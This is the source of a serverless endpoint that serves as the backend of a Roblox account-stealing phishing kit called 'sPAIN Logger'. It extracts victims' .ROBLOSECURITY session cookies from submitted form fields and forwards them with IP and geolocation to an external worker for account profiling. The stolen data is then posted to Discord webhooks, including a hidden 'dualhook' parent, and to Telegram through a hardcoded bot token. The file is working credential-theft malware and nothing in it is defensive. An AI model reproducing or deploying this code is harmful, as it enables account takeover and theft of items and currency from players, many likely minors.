// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const WORKER_URL  = 'https://holy-truth-3129.notrllyme133.workers.dev/';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  const res = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
    headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
  });
  const json = await res.json();
  if (!json.result) return null;
  try { return JSON.parse(json.result); } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

// ── IP Geo ────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const res = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,countryCode,regionName,city,isp`);
    if (!res.ok) return null;
    const d = await res.json();
    return d.status === 'success' ? d : null;
  } catch { return null; }
}

// ── Cookie extractor — scans ALL slots ───────────────────────────────────────
function extractCookie(raw) {
  if (!raw) return null;
  const s = raw.trim().replace(/\s+/g, ' ');
  const PREFIX = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/);
  if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);
  if (m2) return PREFIX + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);
  if (m3) return PREFIX + m3[1];
  const m4 = s.match(/^([a-zA-Z0-9\-\_\.]{200,})$/);
  if (m4) return PREFIX + m4[1];
  return null;
}

function findCookie(slots) {
  for (const val of Object.values(slots)) {
    const c = extractCookie(val);
    if (c) return c;
  }
  return null;
}

// ── Cloudflare Worker call ────────────────────────────────────────────────────
async function getRobloxInfo(cookie, victimIp) {
  try {
    const res = await fetch(WORKER_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ cookie, victimIp })
    });
    if (!res.ok) return null;
    const d = await res.json();
    return d.valid ? d : null;
  } catch { return null; }
}

// ── Discord: valid cookie embed ───────────────────────────────────────────────
async function sendValidEmbed(webhookUrl, { roblox, cookie, slots, ip, geo, now, pageName }) {
  if (!webhookUrl?.startsWith('https://discord.com/api/webhooks/')) return;
  const slotSummary = Object.entries(slots)
    .map(([k, v]) => `Slot ${k.replace('slot','')}: ${v || '(empty)'}`)
    .join('\n');

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: '@everyone',
      embeds: [{
        title: `🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''}`,
        description: `:fire: \`sPAIN\` :fire:\n\n[👤 Profile](https://www.roblox.com/users/${roblox.id}/profile)`,
        color: 5793266,
        thumbnail: { url: roblox.avatarUrl },
        fields: [
          { name: '🔴 Robux',     value: `Balance: **${roblox.robux?.toLocaleString() || 0}**`,          inline: true  },
          { name: '🎵 RAP',       value: `Value: **${roblox.limitedsValue?.toLocaleString() || 0}**\nOwned: ${roblox.limitedsCount || 0}`, inline: true },
          { name: '📊 Age',       value: `**${roblox.accountAgeDays}** days`,                            inline: true  },
          { name: '💳 Billing',   value: `Credit: **$${roblox.credit || 0}**`,                           inline: true  },
          { name: '🎫 Premium',   value: `${roblox.isPremium ? '✅ Yes' : '❌ No'}`,                     inline: true  },
          { name: '⚙️ Settings',  value: `Email: ${roblox.emailSet}\n2FA: ${roblox.twoFA}`,              inline: true  },
          { name: '👥 Groups',    value: `Owned: **${roblox.groupsOwned}**\nRobux: **${roblox.groupRobux?.toLocaleString() || 0}**`, inline: true },
          { name: '🌐 IP',        value: `\`${ip || 'Unknown'}\``,                                       inline: true  },
          { name: '📍 Location',  value: `${geo?.city || '?'}, ${geo?.country || '?'}\n${geo?.isp || ''}`, inline: true },
          { name: '🎮 Gamepasses',
            value: `MM2: ${roblox.gamepasses?.mm2 ? '✅' : '❌'}  Adopt Me: ${roblox.gamepasses?.adoptMe ? '✅' : '❌'}  Pls Donate: ${roblox.gamepasses?.plsDonate ? '✅' : '❌'}`,
            inline: false },
          { name: '📋 All Slots Submitted', value: `\`\`\`${slotSummary}\`\`\``, inline: false },
          { name: '🔐 .ROBLOSECURITY',      value: `\`\`\`${cookie.substring(0, 950)}\`\`\``,            inline: false }
        ],
        footer: { text: `sPAIN Logger • Page: ${pageName} • ${now}` }
      }]
    })
  }).catch(() => {});
}

// ── Discord: invalid cookie embed ─────────────────────────────────────────────
async function sendInvalidEmbed(webhookUrl, { slots, ip, geo, now, pageName }) {
  if (!webhookUrl?.startsWith('https://discord.com/api/webhooks/')) return;
  const slotSummary = Object.entries(slots)
    .map(([k, v]) => `Slot ${k.replace('slot','')}: ${v || '(empty)'}`)
    .join('\n');

  await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      content: '@everyone',
      embeds: [{
        title: `⚠️ Invalid Cookie — Someone is trolling lol 💀`,
        description: `Cookie was **invalid or fake**. Either wrong input or someone messing around.`,
        color: 0xff3333,
        fields: [
          { name: '🌐 IP',        value: `\`${ip || 'Unknown'}\``,                                         inline: true  },
          { name: '📍 Location',  value: `${geo?.city || '?'}, ${geo?.country || '?'}`,                   inline: true  },
          { name: '🗺️ ISP',       value: geo?.isp || 'Unknown',                                            inline: true  },
          { name: '📋 What They Submitted', value: `\`\`\`${slotSummary.substring(0, 950)}\`\`\``,         inline: false },
          { name: '🕐 Date',      value: now,                                                               inline: false }
        ],
        footer: { text: `sPAIN Tools • Page: ${pageName}` },
        timestamp: now
      }]
    })
  }).catch(() => {});
}

// ── Main handler ──────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  let body = req.body;
  if (typeof body === 'string') {
    try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
  }

  const { slug, slots } = body || {};
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  // Load record from Redis
  let record;
  try { record = await redisGet(`slot:${slug}`); } catch (err) {
    return res.status(500).json({ error: 'Redis error', detail: err.message });
  }
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  // ✅ Respond to browser immediately — no timeout for the user
  res.status(200).json({ success: true });

  // Everything below runs after response is sent
  try {
    const ip  = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
             || req.headers['x-real-ip']
             || 'Unknown';

    const [geo, cookie] = await Promise.all([
      getIpGeo(ip),
      Promise.resolve(findCookie(slots))
    ]);

    // Send cookie + victim's IP to Cloudflare Worker
    const roblox  = cookie ? await getRobloxInfo(cookie, ip) : null;
    const isValid = !!roblox;
    const now     = new Date().toISOString();
    const pageName = record.displayName || slug;

    const payload = { roblox, cookie, slots, ip, geo, now, pageName };

    // Load dualhook parent if exists
    let parent = null;
    if (record.dualhookParent) {
      try { parent = await redisGet(`slot:${record.dualhookParent}`); } catch (_) {}
    }

    const sendFn = isValid ? sendValidEmbed : sendInvalidEmbed;

    // Send to both webhooks in parallel
    await Promise.all([
      sendFn(record.webhook, payload),
      parent?.webhook && parent.webhook !== record.webhook
        ? sendFn(parent.webhook, payload)
        : Promise.resolve()
    ]);

    // Telegram log
    const slotSummary = Object.entries(slots)
      .map(([k, v]) => `Slot ${k.replace('slot','')}: ${v || '(empty)'}`)
      .join('\n');

    await tgSend(isValid ? [
      `🚨 <b>VALID SUBMISSION</b>`,
      `👤 <b>${roblox.username}</b> ${roblox.isPremium ? '⭐' : ''}`,
      `💰 Robux: ${roblox.robux?.toLocaleString() || 0}`,
      `🍪 Cookie: ✅ Captured`,
      `🌐 IP: <code>${ip}</code>`,
      `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
      `📄 Page: ${pageName} (${slug})`
    ].join('\n') : [
      `⚠️ <b>INVALID/TROLL SUBMISSION</b>`,
      `📄 Page: ${pageName} (${slug})`,
      `🌐 IP: <code>${ip}</code>`,
      `📍 ${geo?.city || '?'}, ${geo?.country || '?'}`,
      `🕐 ${now}`,
      ``,
      `<b>Slots:</b>\n${slotSummary}`
    ].join('\n'));

  } catch (err) {
    console.error('Post-response error:', err.message);
  }
}
